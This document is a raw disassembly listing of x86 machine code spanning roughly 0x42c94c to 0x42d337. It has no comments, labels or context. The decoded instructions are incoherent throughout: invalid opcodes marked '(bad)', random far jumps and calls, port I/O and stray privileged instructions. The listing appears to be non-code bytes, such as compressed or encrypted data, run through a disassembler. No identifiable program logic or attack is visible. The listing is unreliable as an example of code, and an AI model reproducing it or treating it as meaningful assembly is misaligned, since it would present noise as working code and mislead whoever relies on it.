  42c94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c94d:	add    al,0x42
  42c94f:	xor    DWORD PTR [ecx+0x197e9920],esp
  42c955:	fs mov bh,0x36
  42c958:	retf   
  42c959:	jno    0x42c983
  42c95b:	pop    ecx
  42c95c:	scas   al,BYTE PTR es:[edi]
  42c95d:	stos   BYTE PTR es:[edi],al
  42c95e:	(bad)  
  42c95f:	jmp    0xe534:0xc44532b7
  42c966:	icebp  
  42c967:	aaa    
  42c968:	test   DWORD PTR [ebp+0x0],0xe0aab6
	...
  42c9d3:	add    BYTE PTR [eax],al
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x5d356e45
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [eax-0x2a2a1662],al
  42c9f3:	adc    al,0x2
  42c9f5:	hlt    
  42c9f6:	(bad)  
  42c9f7:	bound  ecx,QWORD PTR [edx]
  42c9f9:	adc    eax,0x1e155a86
  42c9fe:	cmp    ecx,DWORD PTR [ecx-0x4b]
  42ca01:	adc    eax,0xdf3965a0
  42ca06:	jns    0x42c990
  42ca08:	cli    
  42ca09:	jl     0x42ca5c
  42ca0b:	les    edx,FWORD PTR [eax+0x43]
  42ca0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca0f:	test   DWORD PTR [ebp-0x12],0x255de40f
  42ca16:	loop   0x42ca03
  42ca18:	ss sbb al,0x8c
  42ca1b:	nop
  42ca1c:	mov    dh,0xaf
  42ca1e:	mov    ds:0x3785ad77,al
  42ca23:	sub    edx,edi
  42ca25:	js     0x42c9c5
  42ca27:	adc    ebx,edi
  42ca29:	adc    ch,BYTE PTR [ebx-0x1f]
  42ca2c:	push   eax
  42ca2d:	inc    ebp
  42ca2e:	mov    ebx,0x6afaab5b
  42ca33:	dec    edi
  42ca34:	pushf  
  42ca35:	out    dx,al
  42ca36:	mov    al,0xf8
  42ca38:	sahf   
  42ca39:	sub    al,0x91
  42ca3b:	cli    
  42ca3c:	inc    esi
  42ca3d:	call   0xa069:0x14a971d9
  42ca44:	shl    dh,cl
  42ca46:	jge    0x42ca73
  42ca48:	xchg   DWORD PTR [edi*2+0x13899666],edi
  42ca4f:	inc    edi
  42ca50:	sbb    cl,al
  42ca52:	das    
  42ca53:	push   ecx
  42ca54:	and    ah,BYTE PTR [edi-0x14]
  42ca57:	xchg   ecx,eax
  42ca58:	sbb    eax,0x2f0a2260
  42ca5d:	mov    edx,0x42626fa7
  42ca62:	out    dx,eax
  42ca63:	aaa    
  42ca64:	repnz sub eax,0xe601697e
  42ca6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca6b:	out    dx,eax
  42ca6c:	jmp    0x42ca2f
  42ca6e:	inc    ecx
  42ca6f:	fstp   st(5)
  42ca71:	scas   al,BYTE PTR es:[edi]
  42ca72:	mov    dh,0xc6
  42ca74:	mov    dh,0x88
  42ca76:	cdq    
  42ca77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca78:	das    
  42ca79:	arpl   WORD PTR [ecx-0x33360408],cx
  42ca7f:	aas    
  42ca80:	mov    BYTE PTR [edi],bh
  42ca82:	cmp    ebp,DWORD PTR [ebp+0x4f]
  42ca85:	mov    al,0xaa
  42ca87:	mov    edi,0xcf1e21c5
  42ca8c:	jns    0x42ca64
  42ca8e:	inc    eax
  42ca8f:	inc    esi
  42ca90:	mov    edx,0x79aefeeb
  42ca95:	std    
  42ca96:	ins    DWORD PTR es:[edi],dx
  42ca97:	mov    edi,0xbe13a723
  42ca9c:	dec    ebx
  42ca9d:	sbb    al,0x7
  42ca9f:	pop    eax
  42caa0:	cld    
  42caa1:	aas    
  42caa2:	dec    eax
  42caa3:	mov    ds,ebp
  42caa5:	add    esi,esi
  42caa7:	mov    esi,0xc0cb9b9c
  42caac:	pop    esp
  42caad:	(bad)  
  42caaf:	sbb    eax,0xaee3561f
  42cab4:	ds inc ebp
  42cab6:	(bad)  
  42cab7:	std    
  42cab8:	mov    cl,0xa3
  42caba:	call   0xc2a:0x6611e6ad
  42cac1:	adc    eax,0x7591577f
  42cac6:	fwait
  42cac7:	jl     0x42ca77
  42cac9:	cmp    dl,bh
  42cacb:	xor    dh,BYTE PTR [ebx+edx*8-0x75f2d525]
  42cad2:	mov    dh,0xb8
  42cad4:	fst    DWORD PTR [eax-0x46]
  42cad7:	mov    bl,0x4c
  42cad9:	dec    ecx
  42cada:	imul   ebp,DWORD PTR [edi+ecx*1],0xffffff9e
  42cade:	ss cwde 
  42cae0:	push   edi
  42cae1:	sbb    al,0x72
  42cae3:	cmp    eax,0x6600710
  42cae8:	dec    esi
  42cae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42caea:	pop    esi
  42caeb:	out    0xfa,al
  42caed:	inc    esi
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x1fc56ec0]
  42cb64:	xchg   ebx,eax
  42cb65:	sbb    esp,DWORD PTR [edi-0x21]
  42cb68:	add    DWORD PTR [eax],eax
  42cb6a:	add    BYTE PTR [ecx],al
  42cb6c:	add    BYTE PTR [eax],al
  42cb6e:	stc    
  42cb6f:	es jge 0x42cb69
  42cb72:	pop    edi
  42cb73:	sub    esp,DWORD PTR [esi-0x51]
  42cb76:	and    esp,DWORD PTR [esi-0x123f2674]
  42cb7c:	(bad)  [eax]
  42cb7e:	inc    esi
  42cb7f:	inc    esi
  42cb80:	mov    BYTE PTR [edx+ebx*4-0x1c],ch
  42cb84:	xchg   edx,eax
  42cb85:	sub    ebp,DWORD PTR [ecx]
  42cb87:	xchg   ebx,eax
  42cb88:	push   eax
  42cb89:	aad    0xec
  42cb8b:	js     0x42cbad
  42cb8d:	std    
  42cb8e:	sub    edx,eax
  42cb90:	shr    BYTE PTR [eax],cl
  42cb92:	push   esi
  42cb93:	dec    BYTE PTR gs:[ecx+0x62a48fc8]
  42cb9a:	add    eax,0xfd28fd07
  42cb9f:	or     esp,edx
  42cba1:	adc    BYTE PTR [eax+ebp*4+0x6fb5eb95],ch
  42cba8:	ds xchg edi,eax
  42cbaa:	retf   0xde4c
  42cbad:	cdq    
  42cbae:	push   edx
  42cbaf:	mov    edi,0x53c254d1
  42cbb4:	out    dx,eax
  42cbb5:	out    0xbc,al
  42cbb7:	cmp    dh,bh
  42cbb9:	loop   0x42cc1a
  42cbbb:	cs mov bh,0x95
  42cbbe:	outs   dx,DWORD PTR ds:[esi]
  42cbbf:	xchg   edi,eax
  42cbc0:	or     bl,BYTE PTR [esi+0x292de863]
  42cbc6:	in     eax,dx
  42cbc7:	mov    ecx,0x3916d0b3
  42cbcc:	iret   
  42cbcd:	loope  0x42cb9a
  42cbcf:	mov    al,0x58
  42cbd1:	icebp  
  42cbd2:	push   es
  42cbd3:	jne    0x42cb58
  42cbd5:	scas   al,BYTE PTR es:[edi]
  42cbd6:	jmp    0x896116c7
  42cbdb:	enter  0xfcb1,0x77
  42cbdf:	fld    DWORD PTR [edi]
  42cbe1:	or     eax,0x3bd9d918
  42cbe6:	inc    ecx
  42cbe7:	inc    esi
  42cbe8:	dec    edx
  42cbe9:	or     DWORD PTR [esp+ecx*4-0x67],0x70
  42cbee:	cli    
  42cbef:	in     al,dx
  42cbf0:	inc    ecx
  42cbf1:	mov    al,0xc2
  42cbf3:	mov    ah,0xc5
  42cbf5:	mov    dl,0x33
  42cbf7:	mov    eax,DWORD PTR [eax]
  42cbf9:	mov    edx,0xebca8312
  42cbfe:	pop    ebp
  42cbff:	in     al,dx
  42cc00:	add    cl,BYTE PTR [esi]
  42cc02:	dec    eax
  42cc03:	xchg   BYTE PTR [eax+0x2439a49c],bh
  42cc09:	sbb    BYTE PTR [ecx+0x28],bh
  42cc0c:	xor    edi,ecx
  42cc0e:	xor    ecx,DWORD PTR [ebx+0x70]
  42cc11:	sub    al,0x8c
  42cc13:	cwde   
  42cc14:	pop    ecx
  42cc15:	shr    BYTE PTR [eax+0x7a],1
  42cc18:	faddp  st(2),st
  42cc1a:	mov    ecx,DWORD PTR [esi+0x76ab8cdf]
  42cc20:	dec    ebp
  42cc21:	rcr    DWORD PTR [ebx],cl
  42cc23:	push   0xdd34808a
  42cc28:	cwde   
  42cc29:	xor    ecx,ecx
  42cc2b:	rol    DWORD PTR [edi+0x12],1
  42cc2e:	lods   eax,DWORD PTR gs:[esi]
  42cc30:	lods   eax,DWORD PTR ds:[esi]
  42cc31:	and    edx,edx
  42cc33:	ret    0x2060
  42cc36:	add    BYTE PTR [ebx+0x6bd63b19],0xf1
  42cc3d:	sub    edi,0x239446be
  42cc43:	pop    ss
  42cc44:	sub    DWORD PTR [ebp+0x17],ebx
  42cc47:	push   ebp
  42cc48:	sub    DWORD PTR [esi-0x8],ebp
  42cc4b:	fist   DWORD PTR [ebp+0x51]
  42cc4e:	lods   al,BYTE PTR ds:[esi]
  42cc4f:	ficom  DWORD PTR [eax+ebx*2-0xe]
  42cc53:	sbb    esp,DWORD PTR [edx+0x5]
  42cc56:	xor    edi,DWORD PTR [ebx+0x217b6d88]
  42cc5c:	jb     0x42cc31
  42cc5e:	retf   
  42cc5f:	pop    eax
  42cc60:	inc    ebp
  42cc61:	dec    ebx
  42cc62:	fldenv [ebp-0x58fe1e2b]
  42cc68:	jmp    0xf6:0x31dac5f7
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0xa0c77f27
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [edx+0x53],bh
  42ccf0:	push   ebx
  42ccf1:	mov    dl,0x92
  42ccf3:	rcl    DWORD PTR [ebx+0x7f],0x7d
  42ccf7:	into   
  42ccf8:	dec    ebp
  42ccf9:	div    BYTE PTR [eax-0x8]
  42ccfc:	lahf   
  42ccfd:	jge    0x42ccb4
  42ccff:	pop    ebx
  42cd00:	fisub  DWORD PTR [edx]
  42cd02:	push   ebp
  42cd03:	xor    ah,BYTE PTR [ebp+0x73ddc82d]
  42cd09:	inc    edi
  42cd0a:	aas    
  42cd0b:	jmp    0xf90f2b53
  42cd10:	lods   eax,DWORD PTR ds:[esi]
  42cd11:	dec    eax
  42cd12:	shl    DWORD PTR [edi],cl
  42cd14:	cmp    al,0x56
  42cd16:	in     eax,dx
  42cd17:	mov    edx,0xe3311de0
  42cd1c:	es dec ebx
  42cd1e:	loopne 0x42ccfa
  42cd20:	sahf   
  42cd21:	jmp    0x464a4147
  42cd26:	daa    
  42cd27:	out    0xb6,eax
  42cd29:	fs icebp 
  42cd2b:	mov    ebx,0x249254dc
  42cd30:	ja     0x42ccc0
  42cd32:	mov    cl,ch
  42cd34:	pop    ebp
  42cd35:	lea    esi,[edx+0x10185dc7]
  42cd3b:	or     ch,BYTE PTR [ecx+edx*8+0x303e286f]
  42cd42:	push   0x2e
  42cd44:	mov    ah,BYTE PTR [ebp+0x10dae83f]
  42cd4a:	cmp    eax,0xeed12bbc
  42cd4f:	push   es
  42cd50:	mov    eax,ds:0xd33b45ca
  42cd55:	cmc    
  42cd56:	mov    edx,0xa934e866
  42cd5b:	sbb    eax,0x675f1f50
  42cd60:	cld    
  42cd61:	lds    edi,FWORD PTR [esi+0x12]
  42cd64:	repnz shl DWORD PTR [esi],0x77
  42cd68:	xor    al,0xdb
  42cd6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd6b:	jmp    0x959cfae3
  42cd70:	repnz inc edi
  42cd72:	jb     0x42cd14
  42cd74:	ins    BYTE PTR es:[edi],dx
  42cd75:	retw   
  42cd77:	add    cl,BYTE PTR [edx]
  42cd79:	mov    esp,0x368030bc
  42cd7e:	dec    esi
  42cd7f:	adc    cl,BYTE PTR [esp+eax*2]
  42cd82:	outs   dx,DWORD PTR ds:[esi]
  42cd83:	xchg   esp,eax
  42cd84:	lods   al,BYTE PTR ds:[esi]
  42cd85:	mov    bh,0xd
  42cd87:	push   cs
  42cd88:	mov    bl,0x2e
  42cd8a:	jae    0x42cd25
  42cd8c:	push   ebx
  42cd8d:	fbld   TBYTE PTR [ebx+eiz*8]
  42cd90:	mov    cl,0xfc
  42cd92:	cmc    
  42cd93:	mov    WORD PTR [edx-0x16],es
  42cd96:	out    0x8b,eax
  42cd98:	sub    eax,0xb375a199
  42cd9d:	clc    
  42cd9e:	jne    0x42cd76
  42cda0:	lock pop ebx
  42cda2:	mov    edi,0x9e5cbc4b
  42cda7:	fistp  DWORD PTR [edi+eax*1-0x3c]
  42cdab:	jae    0x42ce24
  42cdad:	shl    bl,cl
  42cdaf:	xchg   esi,eax
  42cdb0:	and    eax,0xdae9be4e
  42cdb5:	pop    eax
  42cdb6:	repz add esi,edi
  42cdb9:	add    al,0x94
  42cdbb:	repnz or esp,DWORD PTR [ebx+ebp*8]
  42cdbf:	ins    DWORD PTR es:[edi],dx
  42cdc0:	fwait
  42cdc1:	shl    cl,0x6a
  42cdc4:	cs nop
  42cdc6:	sub    eax,0xc8260a92
  42cdcb:	add    ebx,DWORD PTR [edx-0x182d97a5]
  42cdd1:	outs   dx,DWORD PTR ds:[esi]
  42cdd2:	add    ecx,ebx
  42cdd4:	leave  
  42cdd5:	sbb    BYTE PTR [ebx-0x48],bh
  42cdd8:	jge    0x42cd63
  42cdda:	push   0x29b94549
  42cddf:	mov    edi,0xf5de6caf
  42cde4:	xor    ebx,DWORD PTR [edx]
  42cde6:	fndisi(8087 only) 
  42cde8:	sbb    al,0x2d
  42cdea:	cmp    eax,0xafa63d
	...
  42ce53:	add    BYTE PTR [eax],al
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x32
  42ce63:	int3   
  42ce64:	retf   
  42ce65:	sub    eax,0x1e167
  42ce6a:	add    BYTE PTR [ecx],al
  42ce6c:	add    BYTE PTR [eax],al
  42ce6e:	xchg   ebp,eax
  42ce6f:	mov    WORD PTR [edx+0x2ce4e981],gs
  42ce75:	call   0xed90886a
  42ce7a:	sub    bl,ch
  42ce7c:	shl    BYTE PTR ds:0x5b397cf,1
  42ce82:	inc    ebp
  42ce83:	icebp  
  42ce84:	and    ecx,0x1b
  42ce87:	mov    ecx,0x131249ed
  42ce8c:	cdq    
  42ce8d:	inc    ebp
  42ce8e:	add    BYTE PTR [edx+edx*2+0x4691a63c],al
  42ce95:	pusha  
  42ce96:	fwait
  42ce97:	inc    ebx
  42ce98:	adc    BYTE PTR [ecx-0x7b],ah
  42ce9b:	scas   eax,DWORD PTR es:[edi]
  42ce9c:	cmp    ch,BYTE PTR [eax+0x7c61db27]
  42cea2:	pop    es
  42cea3:	sbb    DWORD PTR [esi],eax
  42cea5:	ins    DWORD PTR es:[edi],dx
  42cea6:	xlat   BYTE PTR ds:[ebx]
  42cea7:	fs into 
  42cea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ceaa:	jbe    0x42cf15
  42ceac:	lods   eax,DWORD PTR ds:[esi]
  42cead:	dec    edi
  42ceae:	std    
  42ceaf:	mov    ch,0x23
  42ceb1:	fmul   DWORD PTR [edx-0x3d1938c3]
  42ceb7:	pop    ebp
  42ceb8:	call   0x39d42e87
  42cebd:	pop    ss
  42cebe:	mov    ch,0x22
  42cec0:	dec    esi
  42cec1:	or     al,0x57
  42cec3:	arpl   WORD PTR [ecx-0x3],sp
  42cec6:	dec    ebp
  42cec7:	push   0x30
  42cec9:	lods   eax,DWORD PTR ds:[esi]
  42ceca:	cmc    
  42cecb:	adc    al,0x5b
  42cecd:	mov    al,0x29
  42cecf:	dec    eax
  42ced0:	daa    
  42ced1:	sbb    bl,bh
  42ced3:	mov    cl,0xab
  42ced5:	adc    ebx,eax
  42ced7:	scas   eax,DWORD PTR es:[edi]
  42ced8:	test   BYTE PTR [ebx-0x6d7fcbdf],ch
  42cede:	and    DWORD PTR [edx-0x35],esp
  42cee1:	fld    TBYTE PTR [edx+eax*1-0x197f5d61]
  42cee8:	(bad)
  42ceec:	dec    esi
  42ceed:	daa    
  42ceee:	pop    ebp
  42ceef:	cmp    al,0xf9
  42cef1:	push   ds
  42cef2:	mov    dh,0x5b
  42cef4:	jge    0x42cf34
  42cef6:	mov    ds:0xcf8d2ebb,eax
  42cefb:	das    
  42cefc:	in     al,dx
  42cefd:	adc    al,0xc5
  42ceff:	add    DWORD PTR [esi+0xe04bd6b],0xe678578a
  42cf09:	ror    BYTE PTR [ebx],cl
  42cf0b:	push   0xffffffb9
  42cf0d:	push   0xffffffb2
  42cf0f:	dec    ebp
  42cf10:	mov    eax,ds:0xe4ec7179
  42cf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf16:	add    eax,0xf5d3380
  42cf1b:	dec    edi
  42cf1c:	xor    dl,BYTE PTR [edx+0x7f029f60]
  42cf22:	push   edx
  42cf23:	cwde   
  42cf24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf25:	push   esi
  42cf26:	imul   edi,DWORD PTR [ebx-0x4ce90e75],0xfe5d70f9
  42cf30:	mov    eax,0xa85ef903
  42cf35:	ret    
  42cf36:	inc    eax
  42cf37:	iret   
  42cf38:	dec    esi
  42cf39:	fwait
  42cf3a:	test   eax,0x35e1b31d
  42cf3f:	fs hlt 
  42cf41:	xor    ah,ah
  42cf43:	repnz test DWORD PTR [edi+eax*8],edx
  42cf47:	sahf   
  42cf48:	pop    esi
  42cf49:	leave  
  42cf4a:	lds    edx,FWORD PTR [edi]
  42cf4c:	(bad)  
  42cf4d:	jmp    0xefc11616
  42cf52:	adc    edx,DWORD PTR ds:0xa1f5c466
  42cf58:	stos   DWORD PTR es:[edi],eax
  42cf59:	ss cmp ebx,eax
  42cf5c:	adc    BYTE PTR [ecx-0x2],bl
  42cf5f:	add    DWORD PTR [ebx-0x2a],esp
  42cf62:	sbb    cl,BYTE PTR fs:[edi]
  42cf65:	jmp    0xfd7e07f0
  42cf6a:	mov    ds,WORD PTR [ecx+0xd3c]
	...
  42cfd4:	add    BYTE PTR [eax],al
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    edx,FWORD PTR [esi-0x5b]
  42cfe4:	cmp    al,BYTE PTR [ecx+0x1e267]
  42cfea:	add    BYTE PTR [ecx],al
  42cfec:	add    BYTE PTR [eax],al
  42cfee:	cmp    bh,BYTE PTR ds:0x8a29eabf
  42cff4:	jae    0x42cfcf
  42cff6:	clc    
  42cff7:	jle    0x42d019
  42cff9:	mov    dh,0x99
  42cffb:	lock (bad) 
  42cffe:	int    0x7d
  42d000:	mov    edi,0x96eba711
  42d005:	lahf   
  42d006:	mov    ds:0xb13af574,al
  42d00b:	ret    0xb954
  42d00e:	sbb    cl,BYTE PTR [edi-0x73]
  42d011:	add    eax,0xfd3f4caf
  42d016:	out    0x1e,eax
  42d018:	out    dx,al
  42d019:	arpl   WORD PTR [edi+0x40a5c161],sp
  42d01f:	dec    ecx
  42d020:	push   ss
  42d021:	mov    ah,0x14
  42d023:	aam    0x64
  42d025:	dec    ebp
  42d026:	inc    edx
  42d027:	in     al,dx
  42d028:	push   edi
  42d029:	inc    eax
  42d02a:	daa    
  42d02b:	sub    DWORD PTR [eax],ebx
  42d02d:	or     ebx,eax
  42d02f:	div    dh
  42d031:	stc    
  42d032:	sahf   
  42d033:	icebp  
  42d034:	fwait
  42d035:	call   FWORD PTR [esi]
  42d037:	jmp    0x2f02b3aa
  42d03c:	jae    0x42d056
  42d03e:	lods   al,BYTE PTR ds:[esi]
  42d03f:	or     al,0xb9
  42d041:	push   ebp
  42d042:	hlt    
  42d043:	pop    ebp
  42d044:	mov    ds:0xd0001071,eax
  42d049:	or     al,0x11
  42d04b:	inc    esi
  42d04c:	xor    al,0x8a
  42d04e:	in     eax,0xea
  42d050:	retf   
  42d051:	rcr    DWORD PTR [ecx+0xa],0x8a
  42d055:	pop    ds
  42d056:	vpunpckldq ymm5,ymm3,YMMWORD PTR [edi+0x359ae895]
  42d05e:	cmp    eax,0xc68fa0ff
  42d063:	ins    BYTE PTR es:[edi],dx
  42d064:	pop    ebx
  42d065:	ret    
  42d066:	pop    esi
  42d067:	mov    ch,0x76
  42d069:	add    bl,al
  42d06b:	aaa    
  42d06c:	arpl   WORD PTR [ecx-0x5ef44adc],di
  42d072:	jns    0x42d005
  42d074:	in     eax,dx
  42d075:	inc    esi
  42d076:	sti    
  42d077:	xor    bl,bh
  42d079:	add    DWORD PTR [esi],ecx
  42d07b:	xchg   esi,eax
  42d07c:	imul   ebx,DWORD PTR [eax],0xffffffbc
  42d07f:	inc    ebp
  42d080:	push   ebx
  42d081:	mov    ebp,ebx
  42d083:	adc    DWORD PTR ss:[edi-0xb76fee5],ebx
  42d08a:	jmp    0x42d0cc
  42d08c:	inc    edx
  42d08d:	and    eax,ebx
  42d08f:	test   BYTE PTR [bp+si-0x3b99],0xb8
  42d095:	mov    dl,0x6c
  42d097:	std    
  42d098:	lds    edx,FWORD PTR ds:0xdb9667e3
  42d09e:	test   DWORD PTR [edi-0x52f40428],ebp
  42d0a4:	outs   dx,DWORD PTR ds:[esi]
  42d0a5:	push   esi
  42d0a6:	dec    esi
  42d0a7:	stos   BYTE PTR es:[edi],al
  42d0a8:	sbb    bh,bl
  42d0aa:	sbb    edi,DWORD PTR [eax]
  42d0ac:	jb     0x42d12d
  42d0ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d0af:	add    eax,0x484d5d36
  42d0b4:	xchg   ecx,eax
  42d0b5:	daa    
  42d0b6:	loopne 0x42d064
  42d0b8:	lods   al,BYTE PTR ds:[esi]
  42d0b9:	add    al,0x27
  42d0bb:	mov    edx,0xca5f8a90
  42d0c0:	pop    ebp
  42d0c1:	sbb    DWORD PTR [esi],0x63
  42d0c4:	mov    esp,0x7c5c7fb2
  42d0c9:	aad    0xe8
  42d0cb:	scas   al,BYTE PTR es:[edi]
  42d0cc:	loope  0x42d078
  42d0ce:	loope  0x42d080
  42d0d0:	mov    edx,0x850d106b
  42d0d5:	or     eax,0x25996bcf
  42d0da:	pop    ss
  42d0db:	fcmovbe st,st(6)
  42d0dd:	push   edx
  42d0de:	or     al,0xd7
  42d0e0:	(bad)  
  42d0e2:	jmp    0xca62:0x2d2a8830
  42d0e9:	ss add esp,esi
  42d0ec:	enter  0x39,0x0
	...
  42d154:	add    BYTE PTR [eax],al
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [edx+0x675b41ad],bl
  42d167:	jecxz  0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [eax],dh
  42d16f:	cmp    al,0x76
  42d171:	(bad)  
  42d172:	addr16 out dx,eax
  42d174:	sbb    bl,BYTE PTR ds:0xa52e4b0
  42d17a:	ret    0xfd67
  42d17d:	cmp    al,0xf4
  42d17f:	xor    DWORD PTR [ebx],ebp
  42d181:	gs adc al,0xa7
  42d184:	mov    cl,0x50
  42d186:	dec    esi
  42d187:	mov    bl,0xa
  42d189:	mov    al,ds:0xc6e8d2e6
  42d18e:	mov    dl,0x7b
  42d190:	mov    al,ds:0x9c46cd5e
  42d195:	jb     0x42d13a
  42d197:	or     esi,edi
  42d199:	xor    bh,cl
  42d19b:	std    
  42d19c:	lods   eax,DWORD PTR ds:[esi]
  42d19d:	fstp   TBYTE PTR [edx-0x71f97292]
  42d1a3:	lods   eax,DWORD PTR ds:[si]
  42d1a5:	repnz xor al,dl
  42d1a8:	cwde   
  42d1a9:	and    al,0xc2
  42d1ab:	adc    ah,BYTE PTR [esi-0x549a6b97]
  42d1b1:	aaa    
  42d1b2:	inc    esp
  42d1b3:	(bad)  
  42d1b4:	cmc    
  42d1b5:	sbb    al,0x45
  42d1b7:	pusha  
  42d1b8:	mov    dl,0x74
  42d1ba:	xchg   ebx,eax
  42d1bb:	mov    esp,0xb2cdcd68
  42d1c0:	lods   eax,DWORD PTR ds:[esi]
  42d1c1:	fs xchg ecx,eax
  42d1c3:	leave  
  42d1c4:	push   ecx
  42d1c5:	pop    edi
  42d1c6:	(bad)  [ebp+0x3632ceca]
  42d1cc:	call   edx
  42d1ce:	jae    0x42d22e
  42d1d0:	mov    edx,0x70d0656d
  42d1d5:	xchg   edx,eax
  42d1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1d7:	jg     0x42d23c
  42d1d9:	cmp    dl,bl
  42d1db:	jnp    0x42d182
  42d1dd:	neg    esp
  42d1df:	inc    ecx
  42d1e0:	sub    al,0xb8
  42d1e2:	inc    eax
  42d1e3:	dec    esi
  42d1e4:	out    dx,al
  42d1e5:	iret   
  42d1e6:	adc    al,0x16
  42d1e8:	pusha  
  42d1e9:	or     BYTE PTR [ebp-0xb],al
  42d1ec:	dec    ebp
  42d1ed:	fimul  DWORD PTR [eax+0x18]
  42d1f0:	sub    esi,DWORD PTR ds:0x1d8aa2b9
  42d1f6:	jns    0x42d1f4
  42d1f8:	imul   edx,eax,0xffffff84
  42d1fb:	push   esp
  42d1fc:	ror    bh,1
  42d1fe:	mov    cl,bl
  42d200:	leave  
  42d201:	sahf   
  42d202:	mov    al,0x51
  42d204:	mov    al,ds:0x8861c979
  42d209:	enter  0xe629,0x3f
  42d20d:	mov    ch,0xc9
  42d20f:	rcl    ecx,1
  42d211:	loope  0x42d22d
  42d213:	fcom   DWORD PTR [edx]
  42d215:	jmp    0xa03:0x29a1d44e
  42d21c:	pop    ss
  42d21d:	cmc    
  42d21e:	jle    0x42d1c7
  42d220:	mov    dh,0xf7
  42d222:	lods   al,BYTE PTR ds:[esi]
  42d223:	fnstcw WORD PTR [edx]
  42d225:	sub    eax,DWORD PTR [edx]
  42d227:	inc    esi
  42d228:	push   ss
  42d229:	bound  edx,QWORD PTR [eax]
  42d22b:	popf   
  42d22c:	gs (bad) 
  42d22f:	push   es
  42d230:	dec    edx
  42d231:	pop    ebp
  42d232:	mov    bh,0xc6
  42d234:	das    
  42d235:	sar    DWORD PTR [ebx+0x7],0xfd
  42d239:	inc    esp
  42d23a:	fcom   DWORD PTR ds:[esi]
  42d23d:	mov    eax,DWORD PTR [esi-0x668079b0]
  42d243:	dec    ebx
  42d244:	loope  0x42d276
  42d246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d247:	gs dec esi
  42d249:	sub    esp,DWORD PTR [ecx+0x31]
  42d24c:	call   0x2d62:0xfc78a08e
  42d253:	les    ebp,FWORD PTR [eax+0x63a83385]
  42d259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d25a:	mov    ebp,0xb85c3a45
  42d25f:	mov    ?,ecx
  42d261:	push   edx
  42d262:	rol    DWORD PTR [eax],cl
  42d264:	pop    ebx
  42d265:	mov    ds:0xbf8a837e,eax
  42d26a:	stos   DWORD PTR es:[edi],eax
  42d26b:	scas   eax,DWORD PTR es:[edi]
  42d26c:	aam    0xa2
	...
  42d2d6:	lea    ecx,[eax]
  42d2d8:	pop    ebp
  42d2d9:	jbe    0x42d2b8
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d272
  42d2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2e4:	pusha  
  42d2e5:	xchg   DWORD PTR [edi-0x1c],esp
  42d2e8:	add    DWORD PTR [eax],eax
  42d2ea:	add    BYTE PTR [ecx],al
  42d2ec:	add    BYTE PTR [eax],al
  42d2ee:	cli    
  42d2ef:	retf   0x2afd
  42d2f2:	aaa    
  42d2f3:	add    DWORD PTR [eax+0x7b],ebp
  42d2f6:	scas   al,BYTE PTR es:[edi]
  42d2f7:	push   ebx
  42d2f8:	enter  0x3f5a,0x88
  42d2fc:	sub    al,0x4f
  42d2fe:	pusha  
  42d2ff:	jmp    0xc784db66
  42d304:	aam    0xab
  42d306:	imul   DWORD PTR [esi+ebx*8-0x6d5045c9]
  42d30d:	push   ebx
  42d30e:	fistp  QWORD PTR [ecx]
  42d310:	imul   esi,DWORD PTR [edi-0xcaee790],0x6e1f278b
  42d31a:	pop    ds
  42d31b:	jns    0x42d318
  42d31d:	shr    BYTE PTR [edx+0x50],cl
  42d320:	mov    bl,ah
  42d322:	mov    gs,esi
  42d324:	push   cs
  42d325:	xor    DWORD PTR [edi-0x5beb4517],0x617a7124
  42d32f:	push   cs
  42d330:	popf   
  42d331:	xchg   edx,eax
  42d332:	(bad)  
  42d333:	retf   0xddc3
  42d336:	cdq    
  42d337:	(bad)  
